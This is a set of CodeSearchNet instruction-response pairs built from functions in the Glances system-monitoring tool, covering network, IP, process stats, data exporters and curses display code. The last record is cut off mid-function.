{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nend of the Glances stats.", "response": "def end(self):\n        \"\"\"End of the Glances stats.\"\"\"\n        # Close export modules\n        for e in self._exports:\n            self._exports[e].exit()\n        # Close plugins\n        for p in self._plugins:\n            self._plugins[p].exit()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nupdate the stats of the network interface with the current stats.", "response": "def update(self):\n        \"\"\"Update network stats using the input method.\n\n        Stats is a list of dict (one dict per interface)\n        \"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n\n            # Grab network interface stat using the psutil net_io_counter method\n            try:\n                netiocounters = psutil.net_io_counters(pernic=True)\n            except UnicodeDecodeError as e:\n                logger.debug('Can not get network interface counters ({})'.format(e))\n                return self.stats\n\n            # Grab interface's status (issue #765)\n            # Grab interface's speed (issue #718)\n            netstatus = {}\n            try:\n                netstatus = psutil.net_if_stats()\n            except OSError as e:\n                # see psutil #797/glances #1106\n                logger.debug('Can not get network interface status ({})'.format(e))\n\n            # Previous network interface stats are stored in the network_old variable\n            if not hasattr(self, 'network_old'):\n                # First call, we init the network_old var\n                try:\n                    self.network_old = netiocounters\n                except (IOError, UnboundLocalError):\n                    pass\n                return self.stats\n\n            # By storing time data we enable Rx/s and Tx/s calculations in the\n            # XML/RPC API, which would otherwise be overly difficult work\n            # for users of the API\n            time_since_update = getTimeSinceLastUpdate('net')\n\n            # Loop over interfaces\n            network_new = netiocounters\n            for net in network_new:\n                # Do not take hidden interface into account\n                # or KeyError: 'eth0' when interface is not connected #1348\n                if self.is_hide(net) or net not in netstatus:\n                    continue\n                try:\n                    cumulative_rx = network_new[net].bytes_recv\n                    cumulative_tx = network_new[net].bytes_sent\n                    cumulative_cx = cumulative_rx + cumulative_tx\n                    rx = cumulative_rx - self.network_old[net].bytes_recv\n                    tx = cumulative_tx - self.network_old[net].bytes_sent\n                    cx = rx + tx\n                    netstat = {'interface_name': n(net),\n                               'time_since_update': time_since_update,\n                               'cumulative_rx': cumulative_rx,\n                               'rx': rx,\n                               'cumulative_tx': cumulative_tx,\n                               'tx': tx,\n                               'cumulative_cx': cumulative_cx,\n                               'cx': cx,\n                               # Interface status\n                               'is_up': netstatus[net].isup,\n                               # Interface speed in Mbps, convert it to bps\n                               # Can be always 0 on some OSes\n                               'speed': netstatus[net].speed * 1048576,\n                               # Set the key for the dict\n                               'key': self.get_key()\n                               }\n                except KeyError:\n                    continue\n                else:\n                    # Append the interface stats to the list\n                    stats.append(netstat)\n\n            # Save stats to compute next bitrate\n            self.network_old = network_new\n\n        elif self.input_method == 'snmp':\n            # Update stats using SNMP\n\n            # SNMP bulk command to get all network interface in one shot\n            try:\n                netiocounters = self.get_stats_snmp(snmp_oid=snmp_oid[self.short_system_name],\n                                                    bulk=True)\n            except KeyError:\n                netiocounters = self.get_stats_snmp(snmp_oid=snmp_oid['default'],\n                                                    bulk=True)\n\n            # Previous network interface stats are stored in the network_old variable\n            if not hasattr(self, 'network_old'):\n                # First call, we init the network_old var\n                try:\n                    self.network_old = netiocounters\n                except (IOError, UnboundLocalError):\n                    pass\n            else:\n                # See description in the 'local' block\n                time_since_update = getTimeSinceLastUpdate('net')\n\n                # Loop over interfaces\n                network_new = netiocounters\n\n                for net in network_new:\n                    # Do not take hidden interface into account\n                    if self.is_hide(net):\n                        continue\n\n                    try:\n                        # Windows: a tips is needed to convert HEX to TXT\n                        # http://blogs.technet.com/b/networking/archive/2009/12/18/how-to-query-the-list-of-network-interfaces-using-snmp-via-the-ifdescr-counter.aspx\n                        if self.short_system_name == 'windows':\n                            try:\n                                interface_name = str(base64.b16decode(net[2:-2].upper()))\n                            except TypeError:\n                                interface_name = net\n                        else:\n                            interface_name = net\n\n                        cumulative_rx = float(network_new[net]['cumulative_rx'])\n                        cumulative_tx = float(network_new[net]['cumulative_tx'])\n                        cumulative_cx = cumulative_rx + cumulative_tx\n                        rx = cumulative_rx - float(self.network_old[net]['cumulative_rx'])\n                        tx = cumulative_tx - float(self.network_old[net]['cumulative_tx'])\n                        cx = rx + tx\n                        netstat = {\n                            'interface_name': interface_name,\n                            'time_since_update': time_since_update,\n                            'cumulative_rx': cumulative_rx,\n                            'rx': rx,\n                            'cumulative_tx': cumulative_tx,\n                            'tx': tx,\n                            'cumulative_cx': cumulative_cx,\n                            'cx': cx}\n                    except KeyError:\n                        continue\n                    else:\n                        netstat['key'] = self.get_key()\n                        stats.append(netstat)\n\n                # Save stats to compute next bitrate\n                self.network_old = network_new\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Max size for the interface name\n        name_max_width = max_width - 12\n\n        # Header\n        msg = '{:{width}}'.format('NETWORK', width=name_max_width)\n        ret.append(self.curse_add_line(msg, \"TITLE\"))\n        if args.network_cumul:\n            # Cumulative stats\n            if args.network_sum:\n                # Sum stats\n                msg = '{:>14}'.format('Rx+Tx')\n                ret.append(self.curse_add_line(msg))\n            else:\n                # Rx/Tx stats\n                msg = '{:>7}'.format('Rx')\n                ret.append(self.curse_add_line(msg))\n                msg = '{:>7}'.format('Tx')\n                ret.append(self.curse_add_line(msg))\n        else:\n            # Bitrate stats\n            if args.network_sum:\n                # Sum stats\n                msg = '{:>14}'.format('Rx+Tx/s')\n                ret.append(self.curse_add_line(msg))\n            else:\n                msg = '{:>7}'.format('Rx/s')\n                ret.append(self.curse_add_line(msg))\n                msg = '{:>7}'.format('Tx/s')\n                ret.append(self.curse_add_line(msg))\n        # Interface list (sorted by name)\n        for i in self.sorted_stats():\n            # Do not display interface in down state (issue #765)\n            if ('is_up' in i) and (i['is_up'] is False):\n                continue\n            # Format stats\n            # Is there an alias for the interface name ?\n            ifrealname = i['interface_name'].split(':')[0]\n            ifname = self.has_alias(i['interface_name'])\n            if ifname is None:\n                ifname = ifrealname\n            if len(ifname) > name_max_width:\n                # Cut interface name if it is too long\n                ifname = '_' + ifname[-name_max_width + 1:]\n\n            if args.byte:\n                # Bytes per second (for dummy)\n                to_bit = 1\n                unit = ''\n            else:\n                # Bits per second (for real network administrator | Default)\n                to_bit = 8\n                unit = 'b'\n\n            if args.network_cumul:\n                rx = self.auto_unit(int(i['cumulative_rx'] * to_bit)) + unit\n                tx = self.auto_unit(int(i['cumulative_tx'] * to_bit)) + unit\n                sx = self.auto_unit(int(i['cumulative_rx'] * to_bit) +\n                                    int(i['cumulative_tx'] * to_bit)) + unit\n            else:\n                rx = self.auto_unit(int(i['rx'] // i['time_since_update'] * to_bit)) + unit\n                tx = self.auto_unit(int(i['tx'] // i['time_since_update'] * to_bit)) + unit\n                sx = self.auto_unit(int(i['rx'] // i['time_since_update'] * to_bit) +\n                                    int(i['tx'] // i['time_since_update'] * to_bit)) + unit\n\n            # New line\n            ret.append(self.curse_new_line())\n            msg = '{:{width}}'.format(ifname, width=name_max_width)\n            ret.append(self.curse_add_line(msg))\n            if args.network_sum:\n                msg = '{:>14}'.format(sx)\n                ret.append(self.curse_add_line(msg))\n            else:\n                msg = '{:>7}'.format(rx)\n                ret.append(self.curse_add_line(\n                    msg, self.get_views(item=i[self.get_key()], key='rx', option='decoration')))\n                msg = '{:>7}'.format(tx)\n                ret.append(self.curse_add_line(\n                    msg, self.get_views(item=i[self.get_key()], key='tx', option='decoration')))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef export(self, name, columns, points):\n        logger.debug(\"Export {} stats to ElasticSearch\".format(name))\n\n        # Create DB input\n        # https://elasticsearch-py.readthedocs.io/en/master/helpers.html\n        actions = []\n        for c, p in zip(columns, points):\n            dtnow = datetime.utcnow()\n            action = {\n                \"_index\": self.index,\n                \"_id\": '{}.{}'.format(name,c),\n                \"_type\": \"glances\",\n                \"_source\": {\n                    \"plugin\": name,\n                    \"metric\": c,\n                    \"value\": str(p),\n                    \"timestamp\": dtnow.isoformat('T')\n                }\n            }\n            logger.debug(\"Exporting the following object to elasticsearch: {}\".format(action))\n            actions.append(action)\n\n        # Write input to the ES index\n        try:\n            helpers.bulk(self.client, actions)\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to ElasticSearch ({})\".format(name, e))", "response": "Write the points to the ES server."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nupdate the stats using the input method.", "response": "def update(self):\n        \"\"\"Update IP stats using the input method.\n\n        Stats is dict\n        \"\"\"\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local' and not import_error_tag:\n            # Update stats using the netifaces lib\n            try:\n                default_gw = netifaces.gateways()['default'][netifaces.AF_INET]\n            except (KeyError, AttributeError) as e:\n                logger.debug(\"Cannot grab the default gateway ({})\".format(e))\n            else:\n                try:\n                    stats['address'] = netifaces.ifaddresses(default_gw[1])[netifaces.AF_INET][0]['addr']\n                    stats['mask'] = netifaces.ifaddresses(default_gw[1])[netifaces.AF_INET][0]['netmask']\n                    stats['mask_cidr'] = self.ip_to_cidr(stats['mask'])\n                    stats['gateway'] = netifaces.gateways()['default'][netifaces.AF_INET][0]\n                    stats['public_address'] = self.public_address\n                except (KeyError, AttributeError) as e:\n                    logger.debug(\"Cannot grab IP information: {}\".format(e))\n        elif self.input_method == 'snmp':\n            # Not implemented yet\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        return self.stats"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nreturn the dict to display in the curse interface.", "response": "def msg_curse(self, args=None, max_width=None):\n        \"\"\"Return the dict to display in the curse interface.\"\"\"\n        # Init the return message\n        ret = []\n\n        # Only process if stats exist and display plugin enable...\n        if not self.stats or self.is_disable():\n            return ret\n\n        # Build the string message\n        msg = ' - '\n        ret.append(self.curse_add_line(msg))\n        msg = 'IP '\n        ret.append(self.curse_add_line(msg, 'TITLE'))\n        if 'address' in self.stats:\n            msg = '{}'.format(self.stats['address'])\n            ret.append(self.curse_add_line(msg))\n        if 'mask_cidr' in self.stats:\n            # VPN with no internet access (issue #842)\n            msg = '/{}'.format(self.stats['mask_cidr'])\n            ret.append(self.curse_add_line(msg))\n        try:\n            msg_pub = '{}'.format(self.stats['public_address'])\n        except (UnicodeEncodeError, KeyError):\n            # Add KeyError exception (see https://github.com/nicolargo/glances/issues/1469)\n            pass\n        else:\n            if self.stats['public_address'] is not None:\n                msg = ' Pub '\n                ret.append(self.curse_add_line(msg, 'TITLE'))\n                ret.append(self.curse_add_line(msg_pub))\n\n        return ret"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nget the first public IP address returned by one of the online services.", "response": "def get(self):\n        \"\"\"Get the first public IP address returned by one of the online services.\"\"\"\n        q = queue.Queue()\n\n        for u, j, k in urls:\n            t = threading.Thread(target=self._get_ip_public, args=(q, u, j, k))\n            t.daemon = True\n            t.start()\n\n        timer = Timer(self.timeout)\n        ip = None\n        while not timer.finished() and ip is None:\n            if q.qsize() > 0:\n                ip = q.get()\n\n        return ', '.join(set([x.strip() for x in ip.split(',')]))"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nrequests the url service and put the result in the queue_target.", "response": "def _get_ip_public(self, queue_target, url, json=False, key=None):\n        \"\"\"Request the url service and put the result in the queue_target.\"\"\"\n        try:\n            response = urlopen(url, timeout=self.timeout).read().decode('utf-8')\n        except Exception as e:\n            logger.debug(\"IP plugin - Cannot open URL {} ({})\".format(url, e))\n            queue_target.put(None)\n        else:\n            # Request depend on service\n            try:\n                if not json:\n                    queue_target.put(response)\n                else:\n                    queue_target.put(loads(response)[key])\n            except ValueError:\n                queue_target.put(None)"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ninitialize the connection to the Kafka server.", "response": "def init(self):\n        \"\"\"Init the connection to the Kafka server.\"\"\"\n        if not self.export_enable:\n            return None\n\n        # Build the server URI with host and port\n        server_uri = '{}:{}'.format(self.host, self.port)\n\n        try:\n            s = KafkaProducer(bootstrap_servers=server_uri,\n                              value_serializer=lambda v: json.dumps(v).encode('utf-8'),\n                              compression_type=self.compression)\n        except Exception as e:\n            logger.critical(\"Cannot connect to Kafka server %s (%s)\" % (server_uri, e))\n            sys.exit(2)\n        else:\n            logger.info(\"Connected to the Kafka server %s\" % server_uri)\n\n        return s"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef export(self, name, columns, points):\n        logger.debug(\"Export {} stats to Kafka\".format(name))\n\n        # Create DB input\n        data = dict(zip(columns, points))\n\n        # Send stats to the kafka topic\n        # key=<plugin name>\n        # value=JSON dict\n        try:\n            self.client.send(self.topic,\n                             key=name,\n                             value=data)\n        except Exception as e:\n            logger.error(\"Cannot export {} stats to Kafka ({})\".format(name, e))", "response": "Write the points to the kafka server."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nclosing the Kafka export module.", "response": "def exit(self):\n        \"\"\"Close the Kafka export module.\"\"\"\n        # To ensure all connections are properly closed\n        self.client.flush()\n        self.client.close()\n        # Call the father method\n        super(Export, self).exit()"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\nsorts the process by IO counters.", "response": "def _sort_io_counters(process,\n                      sortedby='io_counters',\n                      sortedby_secondary='memory_percent'):\n    \"\"\"Specific case for io_counters\n    Sum of io_r + io_w\"\"\"\n    return process[sortedby][0] - process[sortedby][2] + process[sortedby][1] - process[sortedby][3]"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef _sort_lambda(sortedby='cpu_percent',\n                 sortedby_secondary='memory_percent'):\n    \"\"\"Return a sort lambda function for the sortedbykey\"\"\"\n    ret = None\n    if sortedby == 'io_counters':\n        ret = _sort_io_counters\n    elif sortedby == 'cpu_times':\n        ret = _sort_cpu_times\n    return ret", "response": "Return a sort lambda function for the sortedbykey"}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\nreturn the stats dict sorted by ( sortedby ).", "response": "def sort_stats(stats,\n               sortedby='cpu_percent',\n               sortedby_secondary='memory_percent',\n               reverse=True):\n    \"\"\"Return the stats (dict) sorted by (sortedby).\n\n    Reverse the sort if reverse is True.\n    \"\"\"\n    if sortedby is None and sortedby_secondary is None:\n        # No need to sort...\n        return stats\n\n    # Check if a specific sort should be done\n    sort_lambda = _sort_lambda(sortedby=sortedby,\n                               sortedby_secondary=sortedby_secondary)\n\n    if sort_lambda is not None:\n        # Specific sort\n        try:\n            stats.sort(key=sort_lambda, reverse=reverse)\n        except Exception:\n            # If an error is detected, fallback to cpu_percent\n            stats.sort(key=lambda process: (weighted(process['cpu_percent']),\n                                            weighted(process[sortedby_secondary])),\n                       reverse=reverse)\n    else:\n        # Standard sort\n        try:\n            stats.sort(key=lambda process: (weighted(process[sortedby]),\n                                            weighted(process[sortedby_secondary])),\n                       reverse=reverse)\n        except (KeyError, TypeError):\n            # Fallback to name\n            stats.sort(key=lambda process: process['name'] if process['name'] is not None else '~',\n                       reverse=False)\n\n    return stats"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update_processcount(self, plist):\n        # Update the maximum process ID (pid) number\n        self.processcount['pid_max'] = self.pid_max\n        # For each key in the processcount dict\n        # count the number of processes with the same status\n        for k in iterkeys(self.processcount):\n            self.processcount[k] = len(list(filter(lambda v: v['status'] is k,\n                                                   plist)))\n        # Compute thread\n        self.processcount['thread'] = sum(i['num_threads'] for i in plist\n                                          if i['num_threads'] is not None)\n        # Compute total\n        self.processcount['total'] = len(plist)", "response": "Update the global process count from the current processes list plist"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngetting the maximum PID value.", "response": "def pid_max(self):\n        \"\"\"\n        Get the maximum PID value.\n\n        On Linux, the value is read from the `/proc/sys/kernel/pid_max` file.\n\n        From `man 5 proc`:\n        The default value for this file, 32768, results in the same range of\n        PIDs as on earlier kernels. On 32-bit platfroms, 32768 is the maximum\n        value for pid_max. On 64-bit systems, pid_max can be set to any value\n        up to 2^22 (PID_MAX_LIMIT, approximately 4 million).\n\n        If the file is unreadable or not available for whatever reason,\n        returns None.\n\n        Some other OSes:\n        - On FreeBSD and macOS the maximum is 99999.\n        - On OpenBSD >= 6.0 the maximum is 99999 (was 32766).\n        - On NetBSD the maximum is 30000.\n\n        :returns: int or None\n        \"\"\"\n        if LINUX:\n            # XXX: waiting for https://github.com/giampaolo/psutil/issues/720\n            try:\n                with open('/proc/sys/kernel/pid_max', 'rb') as f:\n                    return int(f.read())\n            except (OSError, IOError):\n                return None\n        else:\n            return None"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nresetting the maximum values dict.", "response": "def reset_max_values(self):\n        \"\"\"Reset the maximum values dict.\"\"\"\n        self._max_values = {}\n        for k in self._max_values_list:\n            self._max_values[k] = 0.0"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef update(self):\n        # Reset the stats\n        self.processlist = []\n        self.reset_processcount()\n\n        # Do not process if disable tag is set\n        if self.disable_tag:\n            return\n\n        # Time since last update (for disk_io rate computation)\n        time_since_update = getTimeSinceLastUpdate('process_disk')\n\n        # Grab standard stats\n        #####################\n        standard_attrs = ['cmdline', 'cpu_percent', 'cpu_times', 'memory_info',\n                          'memory_percent', 'name', 'nice', 'pid', 'ppid',\n                          'status', 'username', 'status', 'num_threads']\n        # io_counters availability: Linux, BSD, Windows, AIX\n        if not MACOS and not SUNOS:\n            standard_attrs += ['io_counters']\n        # gids availability: Unix\n        if not WINDOWS:\n            standard_attrs += ['gids']\n\n        # and build the processes stats list (psutil>=5.3.0)\n        self.processlist = [p.info for p in psutil.process_iter(attrs=standard_attrs,\n                                                                ad_value=None)\n                            # OS-related processes filter\n                            if not (BSD and p.info['name'] == 'idle') and\n                            not (WINDOWS and p.info['name'] == 'System Idle Process') and\n                            not (MACOS and p.info['name'] == 'kernel_task') and\n                            # Kernel threads filter\n                            not (self.no_kernel_threads and LINUX and p.info['gids'].real == 0) and\n                            # User filter\n                            not (self._filter.is_filtered(p.info))]\n\n        # Sort the processes list by the current sort_key\n        self.processlist = sort_stats(self.processlist,\n                                      sortedby=self.sort_key,\n                                      reverse=True)\n\n        # Update the processcount\n        self.update_processcount(self.processlist)\n\n        # Loop over processes and add metadata\n        first = True\n        for proc in self.processlist:\n            # Get extended stats, only for top processes (see issue #403).\n            if first and not self.disable_extended_tag:\n                # - cpu_affinity (Linux, Windows, FreeBSD)\n                # - ionice (Linux and Windows > Vista)\n                # - num_ctx_switches (not available on Illumos/Solaris)\n                # - num_fds (Unix-like)\n                # - num_handles (Windows)\n                # - memory_maps (only swap, Linux)\n                #   https://www.cyberciti.biz/faq/linux-which-process-is-using-swap/\n                # - connections (TCP and UDP)\n                extended = {}\n                try:\n                    top_process = psutil.Process(proc['pid'])\n                    extended_stats = ['cpu_affinity', 'ionice',\n                                      'num_ctx_switches']\n                    if LINUX:\n                        # num_fds only avalable on Unix system (see issue #1351)\n                        extended_stats += ['num_fds']\n                    if WINDOWS:\n                        extended_stats += ['num_handles']\n\n                    # Get the extended stats\n                    extended = top_process.as_dict(attrs=extended_stats,\n                                                   ad_value=None)\n\n                    if LINUX:\n                        try:\n                            extended['memory_swap'] = sum([v.swap for v in top_process.memory_maps()])\n                        except psutil.NoSuchProcess:\n                            pass\n                        except (psutil.AccessDenied, NotImplementedError):\n                            # NotImplementedError: /proc/${PID}/smaps file doesn't exist\n                            # on kernel < 2.6.14 or CONFIG_MMU kernel configuration option\n                            # is not enabled (see psutil #533/glances #413).\n                            extended['memory_swap'] = None\n                    try:\n                        extended['tcp'] = len(top_process.connections(kind=\"tcp\"))\n                        extended['udp'] = len(top_process.connections(kind=\"udp\"))\n                    except (psutil.AccessDenied, psutil.NoSuchProcess):\n                        # Manage issue1283 (psutil.AccessDenied)\n                        extended['tcp'] = None\n                        extended['udp'] = None\n                except (psutil.NoSuchProcess, ValueError, AttributeError) as e:\n                    logger.error('Can not grab extended stats ({})'.format(e))\n                    extended['extended_stats'] = False\n                else:\n                    logger.debug('Grab extended stats for process {}'.format(proc['pid']))\n                    extended['extended_stats'] = True\n                proc.update(extended)\n            first = False\n            # /End of extended stats\n\n            # Time since last update (for disk_io rate computation)\n            proc['time_since_update'] = time_since_update\n\n            # Process status (only keep the first char)\n            proc['status'] = str(proc['status'])[:1].upper()\n\n            # Process IO\n            # procstat['io_counters'] is a list:\n            # [read_bytes, write_bytes, read_bytes_old, write_bytes_old, io_tag]\n            # If io_tag = 0 > Access denied or first time (display \"?\")\n            # If io_tag = 1 > No access denied (display the IO rate)\n            if 'io_counters' in proc and proc['io_counters'] is not None:\n                io_new = [proc['io_counters'].read_bytes,\n                          proc['io_counters'].write_bytes]\n                # For IO rate computation\n                # Append saved IO r/w bytes\n                try:\n                    proc['io_counters'] = io_new + self.io_old[proc['pid']]\n                    io_tag = 1\n                except KeyError:\n                    proc['io_counters'] = io_new + [0, 0]\n                    io_tag = 0\n                # then save the IO r/w bytes\n                self.io_old[proc['pid']] = io_new\n            else:\n                proc['io_counters'] = [0, 0] + [0, 0]\n                io_tag = 0\n            # Append the IO tag (for display)\n            proc['io_counters'] += [io_tag]\n\n        # Compute the maximum value for keys in self._max_values_list: CPU, MEM\n        # Usefull to highlight the processes with maximum values\n        for k in self._max_values_list:\n            values_list = [i[k] for i in self.processlist if i[k] is not None]\n            if values_list != []:\n                self.set_max_values(k, max(values_list))", "response": "Update the processes stats."}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nupdates the AMP status using the systemctl command.", "response": "def update(self, process_list):\n        \"\"\"Update the AMP\"\"\"\n        # Get the systemctl status\n        logger.debug('{}: Update stats using service {}'.format(self.NAME, self.get('service_cmd')))\n        try:\n            res = check_output(self.get('service_cmd').split(), stderr=STDOUT).decode('utf-8')\n        except OSError as e:\n            logger.debug('{}: Error while executing service ({})'.format(self.NAME, e))\n        else:\n            status = {'running': 0, 'stopped': 0, 'upstart': 0}\n            # For each line\n            for r in res.split('\\n'):\n                # Split per space .*\n                l = r.split()\n                if len(l) < 4:\n                    continue\n                if l[1] == '+':\n                    status['running'] += 1\n                elif l[1] == '-':\n                    status['stopped'] += 1\n                elif l[1] == '?':\n                    status['upstart'] += 1\n            # Build the output (string) message\n            output = 'Services\\n'\n            for k, v in iteritems(status):\n                output += '{}: {}\\n'.format(k, v)\n            self.set_result(output, separator=' ')\n\n        return self.result()"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\nconvert seconds to hours minutes and seconds.", "response": "def seconds_to_hms(input_seconds):\n    \"\"\"Convert seconds to human-readable time.\"\"\"\n    minutes, seconds = divmod(input_seconds, 60)\n    hours, minutes = divmod(minutes, 60)\n\n    hours = int(hours)\n    minutes = int(minutes)\n    seconds = str(int(seconds)).zfill(2)\n\n    return hours, minutes, seconds"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nreturns path cmd and arguments for a process cmdline.", "response": "def split_cmdline(cmdline):\n    \"\"\"Return path, cmd and arguments for a process cmdline.\"\"\"\n    path, cmd = os.path.split(cmdline[0])\n    arguments = ' '.join(cmdline[1:])\n    return path, cmd, arguments"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef update(self):\n        # Init new stats\n        stats = self.get_init_value()\n\n        if self.input_method == 'local':\n            # Update stats using the standard system lib\n            # Note: Update is done in the processcount plugin\n            # Just return the processes list\n            stats = glances_processes.getlist()\n\n        elif self.input_method == 'snmp':\n            # No SNMP grab for processes\n            pass\n\n        # Update the stats\n        self.stats = stats\n\n        # Get the max values (dict)\n        # Use Deep copy to avoid change between update and display\n        self.max_values = copy.deepcopy(glances_processes.max_values())\n\n        return self.stats", "response": "Update the processes stats using the input method."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nreturn the alert relative to the Nice configuration list", "response": "def get_nice_alert(self, value):\n        \"\"\"Return the alert relative to the Nice configuration list\"\"\"\n        value = str(value)\n        try:\n            if value in self.get_limit('nice_critical'):\n                return 'CRITICAL'\n        except KeyError:\n            pass\n        try:\n            if value in self.get_limit('nice_warning'):\n                return 'WARNING'\n        except KeyError:\n            pass\n        try:\n            if value in self.get_limit('nice_careful'):\n                return 'CAREFUL'\n        except KeyError:\n            pass\n        return 'DEFAULT'"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef get_process_curses_data(self, p, first, args):\n        ret = [self.curse_new_line()]\n        # CPU\n        if 'cpu_percent' in p and p['cpu_percent'] is not None and p['cpu_percent'] != '':\n            if args.disable_irix and self.nb_log_core != 0:\n                msg = self.layout_stat['cpu'].format(p['cpu_percent'] / float(self.nb_log_core))\n            else:\n                msg = self.layout_stat['cpu'].format(p['cpu_percent'])\n            alert = self.get_alert(p['cpu_percent'],\n                                   highlight_zero=False,\n                                   is_max=(p['cpu_percent'] == self.max_values['cpu_percent']),\n                                   header=\"cpu\")\n            ret.append(self.curse_add_line(msg, alert))\n        else:\n            msg = self.layout_header['cpu'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # MEM\n        if 'memory_percent' in p and p['memory_percent'] is not None and p['memory_percent'] != '':\n            msg = self.layout_stat['mem'].format(p['memory_percent'])\n            alert = self.get_alert(p['memory_percent'],\n                                   highlight_zero=False,\n                                   is_max=(p['memory_percent'] == self.max_values['memory_percent']),\n                                   header=\"mem\")\n            ret.append(self.curse_add_line(msg, alert))\n        else:\n            msg = self.layout_header['mem'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # VMS/RSS\n        if 'memory_info' in p and p['memory_info'] is not None and p['memory_info'] != '':\n            # VMS\n            msg = self.layout_stat['virt'].format(self.auto_unit(p['memory_info'][1], low_precision=False))\n            ret.append(self.curse_add_line(msg, optional=True))\n            # RSS\n            msg = self.layout_stat['res'].format(self.auto_unit(p['memory_info'][0], low_precision=False))\n            ret.append(self.curse_add_line(msg, optional=True))\n        else:\n            msg = self.layout_header['virt'].format('?')\n            ret.append(self.curse_add_line(msg))\n            msg = self.layout_header['res'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # PID\n        msg = self.layout_stat['pid'].format(p['pid'], width=self.__max_pid_size())\n        ret.append(self.curse_add_line(msg))\n        # USER\n        if 'username' in p:\n            # docker internal users are displayed as ints only, therefore str()\n            # Correct issue #886 on Windows OS\n            msg = self.layout_stat['user'].format(str(p['username'])[:9])\n            ret.append(self.curse_add_line(msg))\n        else:\n            msg = self.layout_header['user'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # TIME+\n        try:\n            # Sum user and system time\n            user_system_time = p['cpu_times'][0] + p['cpu_times'][1]\n        except (OverflowError, TypeError) as e:\n            # Catch OverflowError on some Amazon EC2 server\n            # See https://github.com/nicolargo/glances/issues/87\n            # Also catch TypeError on macOS\n            # See: https://github.com/nicolargo/glances/issues/622\n            # logger.debug(\"Cannot get TIME+ ({})\".format(e))\n            msg = self.layout_header['time'].format('?')\n            ret.append(self.curse_add_line(msg, optional=True))\n        else:\n            hours, minutes, seconds = seconds_to_hms(user_system_time)\n            if hours > 99:\n                msg = '{:<7}h'.format(hours)\n            elif 0 < hours < 100:\n                msg = '{}h{}:{}'.format(hours, minutes, seconds)\n            else:\n                msg = '{}:{}'.format(minutes, seconds)\n            msg = self.layout_stat['time'].format(msg)\n            if hours > 0:\n                ret.append(self.curse_add_line(msg,\n                                               decoration='CPU_TIME',\n                                               optional=True))\n            else:\n                ret.append(self.curse_add_line(msg, optional=True))\n        # THREAD\n        if 'num_threads' in p:\n            num_threads = p['num_threads']\n            if num_threads is None:\n                num_threads = '?'\n            msg = self.layout_stat['thread'].format(num_threads)\n            ret.append(self.curse_add_line(msg))\n        else:\n            msg = self.layout_header['thread'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # NICE\n        if 'nice' in p:\n            nice = p['nice']\n            if nice is None:\n                nice = '?'\n            msg = self.layout_stat['nice'].format(nice)\n            ret.append(self.curse_add_line(msg,\n                                           decoration=self.get_nice_alert(nice)))\n        else:\n            msg = self.layout_header['nice'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # STATUS\n        if 'status' in p:\n            status = p['status']\n            msg = self.layout_stat['status'].format(status)\n            if status == 'R':\n                ret.append(self.curse_add_line(msg, decoration='STATUS'))\n            else:\n                ret.append(self.curse_add_line(msg))\n        else:\n            msg = self.layout_header['status'].format('?')\n            ret.append(self.curse_add_line(msg))\n        # IO read/write\n        if 'io_counters' in p and p['io_counters'][4] == 1 and p['time_since_update'] != 0:\n            # Display rate if stats is available and io_tag ([4]) == 1\n            # IO read\n            io_rs = int((p['io_counters'][0] - p['io_counters'][2]) / p['time_since_update'])\n            if io_rs == 0:\n                msg = self.layout_stat['ior'].format(\"0\")\n            else:\n                msg = self.layout_stat['ior'].format(self.auto_unit(io_rs,\n                                                                    low_precision=True))\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n            # IO write\n            io_ws = int((p['io_counters'][1] - p['io_counters'][3]) / p['time_since_update'])\n            if io_ws == 0:\n                msg = self.layout_stat['iow'].format(\"0\")\n            else:\n                msg = self.layout_stat['iow'].format(self.auto_unit(io_ws,\n                                                                    low_precision=True))\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n        else:\n            msg = self.layout_header['ior'].format(\"?\")\n            ret.append(self.curse_add_line(msg, optional=True, additional=True))\n 